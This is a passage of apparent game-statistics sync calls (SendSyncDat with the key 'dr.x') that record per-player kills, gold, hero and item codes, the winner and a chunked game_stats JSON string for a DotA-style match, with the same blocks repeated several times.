	SendSyncDat("dr.x", "5", "8_1", 1227900744);
	SendSyncDat("dr.x", "5", "8_2", 1227895376);
	SendSyncDat("dr.x", "5", "8_3", 1227903025);
	SendSyncDat("dr.x", "5", "8_4", 1227899469);
	SendSyncDat("dr.x", "5", "8_5", 1227902793);
	SendSyncDat("dr.x", "5", "9", 1432510828);
	SendSyncDat("dr.x", "5", "id", 5);
	SendSyncDat("dr.x", "11", "1", 2);
	SendSyncDat("dr.x", "1", "1", 0);
	SendSyncDat("dr.x", "1", "2", 10);
	SendSyncDat("dr.x", "1", "3", 42);
	SendSyncDat("dr.x", "1", "4", 5);
	SendSyncDat("dr.x", "1", "5", 1);
	SendSyncDat("dr.x", "1", "6", 263);
	SendSyncDat("dr.x", "1", "7", 8);
	SendSyncDat("dr.x", "1", "8_0", 1227902028);
	SendSyncDat("dr.x", "1", "8_1", 1227902281);
	SendSyncDat("dr.x", "1", "8_2", 1227903818);
	SendSyncDat("dr.x", "1", "8_3", 1227896137);
	SendSyncDat("dr.x", "1", "8_4", 1227895898);
	SendSyncDat("dr.x", "1", "8_5", 1227896116);
	SendSyncDat("dr.x", "1", "9", 1333027688);
	SendSyncDat("dr.x", "1", "id", 1);
	SendSyncDat("dr.x", "7", "1", 17);
	SendSyncDat("dr.x", "7", "2", 2);
	SendSyncDat("dr.x", "7", "3", 155);
	SendSyncDat("dr.x", "7", "4", 5);
	SendSyncDat("dr.x", "7", "5", 14);
	SendSyncDat("dr.x", "7", "6", 4586);
	SendSyncDat("dr.x", "7", "7", 36);
	SendSyncDat("dr.x", "7", "8_0", 1227900746);
	SendSyncDat("dr.x", "7", "8_1", 1227901785);
	SendSyncDat("dr.x", "7", "8_2", 1227901010);
	SendSyncDat("dr.x", "7", "8_3", 1227897158);
	SendSyncDat("dr.x", "7", "8_4", 1227900994);
	SendSyncDat("dr.x", "7", "8_5", 1227899192);
	SendSyncDat("dr.x", "7", "9", 1160786242);
	SendSyncDat("dr.x", "7", "id", 6);
	SendSyncDat("dr.x", "2", "1", 0);
	SendSyncDat("dr.x", "2", "2", 9);
	SendSyncDat("dr.x", "2", "3", 96);
	SendSyncDat("dr.x", "2", "4", 8);
	SendSyncDat("dr.x", "2", "5", 0);
	SendSyncDat("dr.x", "2", "6", 667);
	SendSyncDat("dr.x", "2", "7", 24);
	SendSyncDat("dr.x", "2", "8_0", 1227895380);
	SendSyncDat("dr.x", "2", "8_1", 1227895864);
	SendSyncDat("dr.x", "2", "8_2", 1227903025);
	SendSyncDat("dr.x", "2", "8_3", 1227896137);
	SendSyncDat("dr.x", "2", "8_4", 0);
	SendSyncDat("dr.x", "2", "8_5", 1227896921);
	SendSyncDat("dr.x", "2", "9", 1315074670);
	SendSyncDat("dr.x", "2", "id", 2);
	SendSyncDat("dr.x", "8", "1", 10);
	SendSyncDat("dr.x", "8", "2", 1);
	SendSyncDat("dr.x", "8", "3", 88);
	SendSyncDat("dr.x", "8", "4", 2);
	SendSyncDat("dr.x", "8", "5", 20);
	SendSyncDat("dr.x", "8", "6", 2070);
	SendSyncDat("dr.x", "8", "7", 0);
	SendSyncDat("dr.x", "8", "8_0", 1227895880);
	SendSyncDat("dr.x", "8", "8_1", 1227900994);
	SendSyncDat("dr.x", "8", "8_2", 1227894863);
	SendSyncDat("dr.x", "8", "8_3", 1227899213);
	SendSyncDat("dr.x", "8", "8_4", 1227902793);
	SendSyncDat("dr.x", "8", "8_5", 1227902028);
	SendSyncDat("dr.x", "8", "9", 1215128178);
	SendSyncDat("dr.x", "8", "id", 7);
	SendSyncDat("dr.x", "3", "1", 2);
	SendSyncDat("dr.x", "3", "2", 9);
	SendSyncDat("dr.x", "3", "3", 65);
	SendSyncDat("dr.x", "3", "4", 7);
	SendSyncDat("dr.x", "3", "5", 0);
	SendSyncDat("dr.x", "3", "6", 42);
	SendSyncDat("dr.x", "3", "7", 3);
	SendSyncDat("dr.x", "3", "8_0", 1227903028);
	SendSyncDat("dr.x", "3", "8_1", 1227895880);
	SendSyncDat("dr.x", "3", "8_2", 1227900746);
	SendSyncDat("dr.x", "3", "8_3", 1227896904);
	SendSyncDat("dr.x", "3", "8_4", 1227896916);
	SendSyncDat("dr.x", "3", "8_5", 0);
	SendSyncDat("dr.x", "3", "9", 1433631084);
	SendSyncDat("dr.x", "3", "id", 3);
	SendSyncDat("dr.x", "9", "1", 2);
	SendSyncDat("dr.x", "9", "2", 3);
	SendSyncDat("dr.x", "9", "3", 79);
	SendSyncDat("dr.x", "9", "4", 2);
	SendSyncDat("dr.x", "9", "5", 9);
	SendSyncDat("dr.x", "9", "6", 2529);
	SendSyncDat("dr.x", "9", "7", 16);
	SendSyncDat("dr.x", "9", "8_0", 1227902028);
	SendSyncDat("dr.x", "9", "8_1", 1227896911);
	SendSyncDat("dr.x", "9", "8_2", 1227896153);
	SendSyncDat("dr.x", "9", "8_3", 1227897137);
	SendSyncDat("dr.x", "9", "8_4", 0);
	SendSyncDat("dr.x", "9", "8_5", 0);
	SendSyncDat("dr.x", "9", "9", 1311780946);
	SendSyncDat("dr.x", "9", "id", 8);
	SendSyncDat("dr.x", "4", "1", 1);
	SendSyncDat("dr.x", "4", "2", 6);
	SendSyncDat("dr.x", "4", "3", 15);
	SendSyncDat("dr.x", "4", "4", 0);
	SendSyncDat("dr.x", "4", "5", 1);
	SendSyncDat("dr.x", "4", "6", 6);
	SendSyncDat("dr.x", "4", "7", 37);
	SendSyncDat("dr.x", "4", "8_0", 0);
	SendSyncDat("dr.x", "4", "8_1", 0);
	SendSyncDat("dr.x", "4", "8_2", 0);
	SendSyncDat("dr.x", "4", "8_3", 0);
	SendSyncDat("dr.x", "4", "8_4", 0);
	SendSyncDat("dr.x", "4", "8_5", 0);
	SendSyncDat("dr.x", "4", "9", 1332766568);
	SendSyncDat("dr.x", "4", "id", 4);
	SendSyncDat("dr.x", "10", "1", 10);
	SendSyncDat("dr.x", "10", "2", 9);
	SendSyncDat("dr.x", "10", "3", 34);
	SendSyncDat("dr.x", "10", "4", 0);
	SendSyncDat("dr.x", "10", "5", 2);
	SendSyncDat("dr.x", "10", "6", 544);
	SendSyncDat("dr.x", "10", "7", 0);
	SendSyncDat("dr.x", "10", "8_0", 1227900746);
	SendSyncDat("dr.x", "10", "8_1", 1227903809);
	SendSyncDat("dr.x", "10", "8_2", 1227895880);
	SendSyncDat("dr.x", "10", "8_3", 1227896116);
	SendSyncDat("dr.x", "10", "8_4", 0);
	SendSyncDat("dr.x", "10", "8_5", 0);
	SendSyncDat("dr.x", "10", "9", 1211117643);
	SendSyncDat("dr.x", "10", "id", 9);
	SendSyncDat("dr.x", "5", "1", 3);
	SendSyncDat("dr.x", "5", "2", 7);
	SendSyncDat("dr.x", "5", "3", 55);
	SendSyncDat("dr.x", "5", "4", 6);
	SendSyncDat("dr.x", "5", "5", 3);
	SendSyncDat("dr.x", "5", "6", 790);
	SendSyncDat("dr.x", "5", "7", 4);
	SendSyncDat("dr.x", "5", "8_0", 1227901785);
	SendSyncDat("dr.x", "5", "8_1", 1227900744);
	SendSyncDat("dr.x", "5", "8_2", 1227895376);
	SendSyncDat("dr.x", "5", "8_3", 1227903025);
	SendSyncDat("dr.x", "5", "8_4", 1227899469);
	SendSyncDat("dr.x", "5", "8_5", 1227902793);
	SendSyncDat("dr.x", "5", "9", 1432510828);
	SendSyncDat("dr.x", "5", "id", 5);
	SendSyncDat("dr.x", "11", "1", 2);
	SendSyncDat("dr.x", "11", "2", 1);
	SendSyncDat("dr.x", "11", "3", 68);
	SendSyncDat("dr.x", "11", "4", 5);
	SendSyncDat("dr.x", "11", "5", 9);
	SendSyncDat("dr.x", "11", "6", 1350);
	SendSyncDat("dr.x", "11", "7", 0);
	SendSyncDat("dr.x", "11", "8_0", 1227902265);
	SendSyncDat("dr.x", "11", "8_1", 1227896907);
	SendSyncDat("dr.x", "11", "8_2", 1227895380);
	SendSyncDat("dr.x", "11", "8_3", 1227896921);
	SendSyncDat("dr.x", "11", "8_4", 1227900994);
	SendSyncDat("dr.x", "11", "8_5", 0);
	SendSyncDat("dr.x", "11", "9", 1212365106);
	SendSyncDat("dr.x", "11", "id", 10);
	SendSyncDat("dr.x", "Global", "Winner", 2);
	SendSyncDat("dr.x", "Global", "m", 27);
	SendSyncDat("dr.x", "Global", "s", 58);
	SendSyncDat("dr.x", "game_stats", "{\"first_hero_kill_time\":262,\"game_start_time\":279,\"players\":[{\"assists\":1,\"courier_kills\":0,\"creep_denies\":5,\"creep_kills\":42,\"d", 1);
	SendSyncDat("dr.x", "1", "1", 0);
	SendSyncDat("dr.x", "1", "2", 10);
	SendSyncDat("dr.x", "1", "3", 42);
	SendSyncDat("dr.x", "1", "4", 5);
	SendSyncDat("dr.x", "1", "5", 1);
	SendSyncDat("dr.x", "1", "6", 263);
	SendSyncDat("dr.x", "1", "7", 8);
	SendSyncDat("dr.x", "1", "8_0", 1227902028);
	SendSyncDat("dr.x", "1", "8_1", 1227902281);
	SendSyncDat("dr.x", "1", "8_2", 1227903818);
	SendSyncDat("dr.x", "1", "8_3", 1227896137);
	SendSyncDat("dr.x", "1", "8_4", 1227895898);
	SendSyncDat("dr.x", "1", "8_5", 1227896116);
	SendSyncDat("dr.x", "1", "9", 1333027688);
	SendSyncDat("dr.x", "1", "id", 1);
	SendSyncDat("dr.x", "7", "1", 17);
	SendSyncDat("dr.x", "7", "2", 2);
	SendSyncDat("dr.x", "7", "3", 155);
	SendSyncDat("dr.x", "7", "4", 5);
	SendSyncDat("dr.x", "7", "5", 14);
	SendSyncDat("dr.x", "7", "6", 4586);
	SendSyncDat("dr.x", "7", "7", 36);
	SendSyncDat("dr.x", "7", "8_0", 1227900746);
	SendSyncDat("dr.x", "7", "8_1", 1227901785);
	SendSyncDat("dr.x", "7", "8_2", 1227901010);
	SendSyncDat("dr.x", "7", "8_3", 1227897158);
	SendSyncDat("dr.x", "7", "8_4", 1227900994);
	SendSyncDat("dr.x", "7", "8_5", 1227899192);
	SendSyncDat("dr.x", "7", "9", 1160786242);
	SendSyncDat("dr.x", "7", "id", 6);
	SendSyncDat("dr.x", "2", "1", 0);
	SendSyncDat("dr.x", "2", "2", 9);
	SendSyncDat("dr.x", "2", "3", 96);
	SendSyncDat("dr.x", "2", "4", 8);
	SendSyncDat("dr.x", "2", "5", 0);
	SendSyncDat("dr.x", "2", "6", 667);
	SendSyncDat("dr.x", "2", "7", 24);
	SendSyncDat("dr.x", "2", "8_0", 1227895380);
	SendSyncDat("dr.x", "2", "8_1", 1227895864);
	SendSyncDat("dr.x", "2", "8_2", 1227903025);
	SendSyncDat("dr.x", "2", "8_3", 1227896137);
	SendSyncDat("dr.x", "2", "8_4", 0);
	SendSyncDat("dr.x", "2", "8_5", 1227896921);
	SendSyncDat("dr.x", "2", "9", 1315074670);
	SendSyncDat("dr.x", "2", "id", 2);
	SendSyncDat("dr.x", "8", "1", 10);
	SendSyncDat("dr.x", "8", "2", 1);
	SendSyncDat("dr.x", "8", "3", 88);
	SendSyncDat("dr.x", "8", "4", 2);
	SendSyncDat("dr.x", "8", "5", 20);
	SendSyncDat("dr.x", "8", "6", 2070);
	SendSyncDat("dr.x", "8", "7", 0);
	SendSyncDat("dr.x", "8", "8_0", 1227895880);
	SendSyncDat("dr.x", "8", "8_1", 1227900994);
	SendSyncDat("dr.x", "8", "8_2", 1227894863);
	SendSyncDat("dr.x", "8", "8_3", 1227899213);
	SendSyncDat("dr.x", "8", "8_4", 1227902793);
	SendSyncDat("dr.x", "8", "8_5", 1227902028);
	SendSyncDat("dr.x", "8", "9", 1215128178);
	SendSyncDat("dr.x", "8", "id", 7);
	SendSyncDat("dr.x", "3", "1", 2);
	SendSyncDat("dr.x", "3", "2", 9);
	SendSyncDat("dr.x", "3", "3", 65);
	SendSyncDat("dr.x", "3", "4", 7);
	SendSyncDat("dr.x", "3", "5", 0);
	SendSyncDat("dr.x", "3", "6", 42);
	SendSyncDat("dr.x", "3", "7", 3);
	SendSyncDat("dr.x", "3", "8_0", 1227903028);
	SendSyncDat("dr.x", "3", "8_1", 1227895880);
	SendSyncDat("dr.x", "3", "8_2", 1227900746);
	SendSyncDat("dr.x", "3", "8_3", 1227896904);
	SendSyncDat("dr.x", "3", "8_4", 1227896916);
	SendSyncDat("dr.x", "3", "8_5", 0);
	SendSyncDat("dr.x", "3", "9", 1433631084);
	SendSyncDat("dr.x", "3", "id", 3);
	SendSyncDat("dr.x", "9", "1", 2);
	SendSyncDat("dr.x", "9", "2", 3);
	SendSyncDat("dr.x", "9", "3", 79);
	SendSyncDat("dr.x", "9", "4", 2);
	SendSyncDat("dr.x", "9", "5", 9);
	SendSyncDat("dr.x", "9", "6", 2529);
	SendSyncDat("dr.x", "9", "7", 16);
	SendSyncDat("dr.x", "9", "8_0", 1227902028);
	SendSyncDat("dr.x", "9", "8_1", 1227896911);
	SendSyncDat("dr.x", "9", "8_2", 1227896153);
	SendSyncDat("dr.x", "9", "8_3", 1227897137);
	SendSyncDat("dr.x", "9", "8_4", 0);
	SendSyncDat("dr.x", "9", "8_5", 0);
	SendSyncDat("dr.x", "9", "9", 1311780946);
	SendSyncDat("dr.x", "9", "id", 8);
	SendSyncDat("dr.x", "4", "1", 1);
	SendSyncDat("dr.x", "4", "2", 6);
	SendSyncDat("dr.x", "4", "3", 15);
	SendSyncDat("dr.x", "4", "4", 0);
	SendSyncDat("dr.x", "4", "5", 1);
	SendSyncDat("dr.x", "4", "6", 6);
	SendSyncDat("dr.x", "4", "7", 37);
	SendSyncDat("dr.x", "4", "8_0", 0);
	SendSyncDat("dr.x", "4", "8_1", 0);
	SendSyncDat("dr.x", "4", "8_2", 0);
	SendSyncDat("dr.x", "4", "8_3", 0);
	SendSyncDat("dr.x", "4", "8_4", 0);
	SendSyncDat("dr.x", "4", "8_5", 0);
	SendSyncDat("dr.x", "4", "9", 1332766568);
	SendSyncDat("dr.x", "4", "id", 4);
	SendSyncDat("dr.x", "10", "1", 10);
	SendSyncDat("dr.x", "10", "2", 9);
	SendSyncDat("dr.x", "10", "3", 34);
	SendSyncDat("dr.x", "10", "4", 0);
	SendSyncDat("dr.x", "10", "5", 2);
	SendSyncDat("dr.x", "10", "6", 544);
	SendSyncDat("dr.x", "10", "7", 0);
	SendSyncDat("dr.x", "10", "8_0", 1227900746);
	SendSyncDat("dr.x", "10", "8_1", 1227903809);
	SendSyncDat("dr.x", "10", "8_2", 1227895880);
	SendSyncDat("dr.x", "10", "8_3", 1227896116);
	SendSyncDat("dr.x", "10", "8_4", 0);
	SendSyncDat("dr.x", "10", "8_5", 0);
	SendSyncDat("dr.x", "10", "9", 1211117643);
	SendSyncDat("dr.x", "10", "id", 9);
	SendSyncDat("dr.x", "5", "1", 3);
	SendSyncDat("dr.x", "5", "2", 7);
	SendSyncDat("dr.x", "5", "3", 55);
	SendSyncDat("dr.x", "5", "4", 6);
	SendSyncDat("dr.x", "5", "5", 3);
	SendSyncDat("dr.x", "5", "6", 790);
	SendSyncDat("dr.x", "5", "7", 4);
	SendSyncDat("dr.x", "5", "8_0", 1227901785);
	SendSyncDat("dr.x", "5", "8_1", 1227900744);
	SendSyncDat("dr.x", "5", "8_2", 1227895376);
	SendSyncDat("dr.x", "5", "8_3", 1227903025);
	SendSyncDat("dr.x", "5", "8_4", 1227899469);
	SendSyncDat("dr.x", "5", "8_5", 1227902793);
	SendSyncDat("dr.x", "5", "9", 1432510828);
	SendSyncDat("dr.x", "5", "id", 5);
	SendSyncDat("dr.x", "11", "1", 2);
	SendSyncDat("dr.x", "11", "2", 1);
	SendSyncDat("dr.x", "11", "3", 68);
	SendSyncDat("dr.x", "11", "4", 5);
	SendSyncDat("dr.x", "11", "5", 9);
	SendSyncDat("dr.x", "11", "6", 1350);
	SendSyncDat("dr.x", "11", "7", 0);
	SendSyncDat("dr.x", "11", "8_0", 1227902265);
	SendSyncDat("dr.x", "11", "8_1", 1227896907);
	SendSyncDat("dr.x", "11", "8_2", 1227895380);
	SendSyncDat("dr.x", "11", "8_3", 1227896921);
	SendSyncDat("dr.x", "11", "8_4", 1227900994);
	SendSyncDat("dr.x", "11", "8_5", 0);
	SendSyncDat("dr.x", "11", "9", 1212365106);
	SendSyncDat("dr.x", "11", "id", 10);
	SendSyncDat("dr.x", "Global", "Winner", 2);
	SendSyncDat("dr.x", "Global", "m", 27);
	SendSyncDat("dr.x", "Global", "s", 58);
	SendSyncDat("dr.x", "game_stats", "{\"first_hero_kill_time\":262,\"game_start_time\":279,\"players\":[{\"assists\":1,\"courier_kills\":0,\"creep_denies\":5,\"creep_kills\":42,\"d", 1);
	SendSyncDat("dr.x", "game_stats", "eaths\":10,\"firestone\":0,\"froststone\":0,\"gold\":263,\"hero\":1333027688,\"id\":1,\"items\":[1227902028,1227902281,1227903818,1227896137,", 1);
	SendSyncDat("dr.x", "game_stats", "1227895898,1227896116],\"kills\":0,\"left_time\":0,\"neutral_kills\":8,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_ki", 1);
	SendSyncDat("dr.x", "game_stats", "lls\":0,\"tower_kills\":0},{\"assists\":0,\"courier_kills\":0,\"creep_denies\":8,\"creep_kills\":96,\"deaths\":9,\"firestone\":0,\"froststone\":0", 1);
	SendSyncDat("dr.x", "1", "1", 0);
	SendSyncDat("dr.x", "1", "2", 10);
	SendSyncDat("dr.x", "1", "3", 42);
	SendSyncDat("dr.x", "1", "4", 5);
	SendSyncDat("dr.x", "1", "5", 1);
	SendSyncDat("dr.x", "1", "6", 263);
	SendSyncDat("dr.x", "1", "7", 8);
	SendSyncDat("dr.x", "1", "8_0", 1227902028);
	SendSyncDat("dr.x", "1", "8_1", 1227902281);
	SendSyncDat("dr.x", "1", "8_2", 1227903818);
	SendSyncDat("dr.x", "1", "8_3", 1227896137);
	SendSyncDat("dr.x", "1", "8_4", 1227895898);
	SendSyncDat("dr.x", "1", "8_5", 1227896116);
	SendSyncDat("dr.x", "1", "9", 1333027688);
	SendSyncDat("dr.x", "1", "id", 1);
	SendSyncDat("dr.x", "7", "1", 17);
	SendSyncDat("dr.x", "7", "2", 2);
	SendSyncDat("dr.x", "7", "3", 155);
	SendSyncDat("dr.x", "7", "4", 5);
	SendSyncDat("dr.x", "7", "5", 14);
	SendSyncDat("dr.x", "7", "6", 4586);
	SendSyncDat("dr.x", "7", "7", 36);
	SendSyncDat("dr.x", "7", "8_0", 1227900746);
	SendSyncDat("dr.x", "7", "8_1", 1227901785);
	SendSyncDat("dr.x", "7", "8_2", 1227901010);
	SendSyncDat("dr.x", "7", "8_3", 1227897158);
	SendSyncDat("dr.x", "7", "8_4", 1227900994);
	SendSyncDat("dr.x", "7", "8_5", 1227899192);
	SendSyncDat("dr.x", "7", "9", 1160786242);
	SendSyncDat("dr.x", "7", "id", 6);
	SendSyncDat("dr.x", "2", "1", 0);
	SendSyncDat("dr.x", "2", "2", 9);
	SendSyncDat("dr.x", "2", "3", 96);
	SendSyncDat("dr.x", "2", "4", 8);
	SendSyncDat("dr.x", "2", "5", 0);
	SendSyncDat("dr.x", "2", "6", 667);
	SendSyncDat("dr.x", "2", "7", 24);
	SendSyncDat("dr.x", "2", "8_0", 1227895380);
	SendSyncDat("dr.x", "2", "8_1", 1227895864);
	SendSyncDat("dr.x", "2", "8_2", 1227903025);
	SendSyncDat("dr.x", "2", "8_3", 1227896137);
	SendSyncDat("dr.x", "2", "8_4", 0);
	SendSyncDat("dr.x", "2", "8_5", 1227896921);
	SendSyncDat("dr.x", "2", "9", 1315074670);
	SendSyncDat("dr.x", "2", "id", 2);
	SendSyncDat("dr.x", "8", "1", 10);
	SendSyncDat("dr.x", "8", "2", 1);
	SendSyncDat("dr.x", "8", "3", 88);
	SendSyncDat("dr.x", "8", "4", 2);
	SendSyncDat("dr.x", "8", "5", 20);
	SendSyncDat("dr.x", "8", "6", 2070);
	SendSyncDat("dr.x", "8", "7", 0);
	SendSyncDat("dr.x", "8", "8_0", 1227895880);
	SendSyncDat("dr.x", "8", "8_1", 1227900994);
	SendSyncDat("dr.x", "8", "8_2", 1227894863);
	SendSyncDat("dr.x", "8", "8_3", 1227899213);
	SendSyncDat("dr.x", "8", "8_4", 1227902793);
	SendSyncDat("dr.x", "8", "8_5", 1227902028);
	SendSyncDat("dr.x", "8", "9", 1215128178);
	SendSyncDat("dr.x", "8", "id", 7);
	SendSyncDat("dr.x", "3", "1", 2);
	SendSyncDat("dr.x", "3", "2", 9);
	SendSyncDat("dr.x", "3", "3", 65);
	SendSyncDat("dr.x", "3", "4", 7);
	SendSyncDat("dr.x", "3", "5", 0);
	SendSyncDat("dr.x", "3", "6", 42);
	SendSyncDat("dr.x", "3", "7", 3);
	SendSyncDat("dr.x", "3", "8_0", 1227903028);
	SendSyncDat("dr.x", "3", "8_1", 1227895880);
	SendSyncDat("dr.x", "3", "8_2", 1227900746);
	SendSyncDat("dr.x", "3", "8_3", 1227896904);
	SendSyncDat("dr.x", "3", "8_4", 1227896916);
	SendSyncDat("dr.x", "3", "8_5", 0);
	SendSyncDat("dr.x", "3", "9", 1433631084);
	SendSyncDat("dr.x", "3", "id", 3);
	SendSyncDat("dr.x", "9", "1", 2);
	SendSyncDat("dr.x", "9", "2", 3);
	SendSyncDat("dr.x", "9", "3", 79);
	SendSyncDat("dr.x", "9", "4", 2);
	SendSyncDat("dr.x", "9", "5", 9);
	SendSyncDat("dr.x", "9", "6", 2529);
	SendSyncDat("dr.x", "9", "7", 16);
	SendSyncDat("dr.x", "9", "8_0", 1227902028);
	SendSyncDat("dr.x", "9", "8_1", 1227896911);
	SendSyncDat("dr.x", "9", "8_2", 1227896153);
	SendSyncDat("dr.x", "9", "8_3", 1227897137);
	SendSyncDat("dr.x", "9", "8_4", 0);
	SendSyncDat("dr.x", "9", "8_5", 0);
	SendSyncDat("dr.x", "9", "9", 1311780946);
	SendSyncDat("dr.x", "9", "id", 8);
	SendSyncDat("dr.x", "4", "1", 1);
	SendSyncDat("dr.x", "4", "2", 6);
	SendSyncDat("dr.x", "4", "3", 15);
	SendSyncDat("dr.x", "4", "4", 0);
	SendSyncDat("dr.x", "4", "5", 1);
	SendSyncDat("dr.x", "4", "6", 6);
	SendSyncDat("dr.x", "4", "7", 37);
	SendSyncDat("dr.x", "4", "8_0", 0);
	SendSyncDat("dr.x", "4", "8_1", 0);
	SendSyncDat("dr.x", "4", "8_2", 0);
	SendSyncDat("dr.x", "4", "8_3", 0);
	SendSyncDat("dr.x", "4", "8_4", 0);
	SendSyncDat("dr.x", "4", "8_5", 0);
	SendSyncDat("dr.x", "4", "9", 1332766568);
	SendSyncDat("dr.x", "4", "id", 4);
	SendSyncDat("dr.x", "10", "1", 10);
	SendSyncDat("dr.x", "10", "2", 9);
	SendSyncDat("dr.x", "10", "3", 34);
	SendSyncDat("dr.x", "10", "4", 0);
	SendSyncDat("dr.x", "10", "5", 2);
	SendSyncDat("dr.x", "10", "6", 544);
	SendSyncDat("dr.x", "10", "7", 0);
	SendSyncDat("dr.x", "10", "8_0", 1227900746);
	SendSyncDat("dr.x", "10", "8_1", 1227903809);
	SendSyncDat("dr.x", "10", "8_2", 1227895880);
	SendSyncDat("dr.x", "10", "8_3", 1227896116);
	SendSyncDat("dr.x", "10", "8_4", 0);
	SendSyncDat("dr.x", "10", "8_5", 0);
	SendSyncDat("dr.x", "10", "9", 1211117643);
	SendSyncDat("dr.x", "10", "id", 9);
	SendSyncDat("dr.x", "5", "1", 3);
	SendSyncDat("dr.x", "5", "2", 7);
	SendSyncDat("dr.x", "5", "3", 55);
	SendSyncDat("dr.x", "5", "4", 6);
	SendSyncDat("dr.x", "5", "5", 3);
	SendSyncDat("dr.x", "5", "6", 790);
	SendSyncDat("dr.x", "5", "7", 4);
	SendSyncDat("dr.x", "5", "8_0", 1227901785);
	SendSyncDat("dr.x", "5", "8_1", 1227900744);
	SendSyncDat("dr.x", "5", "8_2", 1227895376);
	SendSyncDat("dr.x", "5", "8_3", 1227903025);
	SendSyncDat("dr.x", "5", "8_4", 1227899469);
	SendSyncDat("dr.x", "5", "8_5", 1227902793);
	SendSyncDat("dr.x", "5", "9", 1432510828);
	SendSyncDat("dr.x", "5", "id", 5);
	SendSyncDat("dr.x", "11", "1", 2);
	SendSyncDat("dr.x", "1", "1", 0);
	SendSyncDat("dr.x", "1", "2", 10);
	SendSyncDat("dr.x", "1", "3", 42);
	SendSyncDat("dr.x", "1", "4", 5);
	SendSyncDat("dr.x", "1", "5", 1);
	SendSyncDat("dr.x", "1", "6", 263);
	SendSyncDat("dr.x", "1", "7", 8);
	SendSyncDat("dr.x", "1", "8_0", 1227902028);
	SendSyncDat("dr.x", "1", "8_1", 1227902281);
	SendSyncDat("dr.x", "1", "8_2", 1227903818);
	SendSyncDat("dr.x", "1", "8_3", 1227896137);
	SendSyncDat("dr.x", "1", "8_4", 1227895898);
	SendSyncDat("dr.x", "1", "8_5", 1227896116);
	SendSyncDat("dr.x", "1", "9", 1333027688);
	SendSyncDat("dr.x", "1", "id", 1);
	SendSyncDat("dr.x", "7", "1", 17);
	SendSyncDat("dr.x", "7", "2", 2);
	SendSyncDat("dr.x", "7", "3", 155);
	SendSyncDat("dr.x", "7", "4", 5);
	SendSyncDat("dr.x", "7", "5", 14);
	SendSyncDat("dr.x", "7", "6", 4586);
	SendSyncDat("dr.x", "7", "7", 36);
	SendSyncDat("dr.x", "7", "8_0", 1227900746);
	SendSyncDat("dr.x", "7", "8_1", 1227901785);
	SendSyncDat("dr.x", "7", "8_2", 1227901010);
	SendSyncDat("dr.x", "7", "8_3", 1227897158);
	SendSyncDat("dr.x", "7", "8_4", 1227900994);
	SendSyncDat("dr.x", "7", "8_5", 1227899192);
	SendSyncDat("dr.x", "7", "9", 1160786242);
	SendSyncDat("dr.x", "7", "id", 6);
	SendSyncDat("dr.x", "2", "1", 0);
	SendSyncDat("dr.x", "2", "2", 9);
	SendSyncDat("dr.x", "2", "3", 96);
	SendSyncDat("dr.x", "2", "4", 8);
	SendSyncDat("dr.x", "2", "5", 0);
	SendSyncDat("dr.x", "2", "6", 667);
	SendSyncDat("dr.x", "2", "7", 24);
	SendSyncDat("dr.x", "2", "8_0", 1227895380);
	SendSyncDat("dr.x", "2", "8_1", 1227895864);
	SendSyncDat("dr.x", "2", "8_2", 1227903025);
	SendSyncDat("dr.x", "2", "8_3", 1227896137);
	SendSyncDat("dr.x", "2", "8_4", 0);
	SendSyncDat("dr.x", "2", "8_5", 1227896921);
	SendSyncDat("dr.x", "2", "9", 1315074670);
	SendSyncDat("dr.x", "2", "id", 2);
	SendSyncDat("dr.x", "8", "1", 10);
	SendSyncDat("dr.x", "8", "2", 1);
	SendSyncDat("dr.x", "8", "3", 88);
	SendSyncDat("dr.x", "8", "4", 2);
	SendSyncDat("dr.x", "8", "5", 20);
	SendSyncDat("dr.x", "8", "6", 2070);
	SendSyncDat("dr.x", "8", "7", 0);
	SendSyncDat("dr.x", "8", "8_0", 1227895880);
	SendSyncDat("dr.x", "8", "8_1", 1227900994);
	SendSyncDat("dr.x", "8", "8_2", 1227894863);
	SendSyncDat("dr.x", "8", "8_3", 1227899213);
	SendSyncDat("dr.x", "8", "8_4", 1227902793);
	SendSyncDat("dr.x", "8", "8_5", 1227902028);
	SendSyncDat("dr.x", "8", "9", 1215128178);
	SendSyncDat("dr.x", "8", "id", 7);
	SendSyncDat("dr.x", "3", "1", 2);
	SendSyncDat("dr.x", "3", "2", 9);
	SendSyncDat("dr.x", "3", "3", 65);
	SendSyncDat("dr.x", "3", "4", 7);
	SendSyncDat("dr.x", "3", "5", 0);
	SendSyncDat("dr.x", "3", "6", 42);
	SendSyncDat("dr.x", "3", "7", 3);
	SendSyncDat("dr.x", "3", "8_0", 1227903028);
	SendSyncDat("dr.x", "3", "8_1", 1227895880);
	SendSyncDat("dr.x", "3", "8_2", 1227900746);
	SendSyncDat("dr.x", "3", "8_3", 1227896904);
	SendSyncDat("dr.x", "3", "8_4", 1227896916);
	SendSyncDat("dr.x", "3", "8_5", 0);
	SendSyncDat("dr.x", "3", "9", 1433631084);
	SendSyncDat("dr.x", "3", "id", 3);
	SendSyncDat("dr.x", "9", "1", 2);
	SendSyncDat("dr.x", "9", "2", 3);
	SendSyncDat("dr.x", "9", "3", 79);
	SendSyncDat("dr.x", "9", "4", 2);
	SendSyncDat("dr.x", "9", "5", 9);
	SendSyncDat("dr.x", "9", "6", 2529);
	SendSyncDat("dr.x", "9", "7", 16);
	SendSyncDat("dr.x", "9", "8_0", 1227902028);
	SendSyncDat("dr.x", "9", "8_1", 1227896911);
	SendSyncDat("dr.x", "9", "8_2", 1227896153);
	SendSyncDat("dr.x", "9", "8_3", 1227897137);
	SendSyncDat("dr.x", "9", "8_4", 0);
	SendSyncDat("dr.x", "9", "8_5", 0);
	SendSyncDat("dr.x", "9", "9", 1311780946);
	SendSyncDat("dr.x", "9", "id", 8);
	SendSyncDat("dr.x", "4", "1", 1);
	SendSyncDat("dr.x", "4", "2", 6);
	SendSyncDat("dr.x", "4", "3", 15);
	SendSyncDat("dr.x", "4", "4", 0);
	SendSyncDat("dr.x", "4", "5", 1);
	SendSyncDat("dr.x", "4", "6", 6);
	SendSyncDat("dr.x", "4", "7", 37);
	SendSyncDat("dr.x", "4", "8_0", 0);
	SendSyncDat("dr.x", "4", "8_1", 0);
	SendSyncDat("dr.x", "4", "8_2", 0);
	SendSyncDat("dr.x", "4", "8_3", 0);
	SendSyncDat("dr.x", "4", "8_4", 0);
	SendSyncDat("dr.x", "4", "8_5", 0);
	SendSyncDat("dr.x", "4", "9", 1332766568);
	SendSyncDat("dr.x", "4", "id", 4);
	SendSyncDat("dr.x", "10", "1", 10);
	SendSyncDat("dr.x", "10", "2", 9);
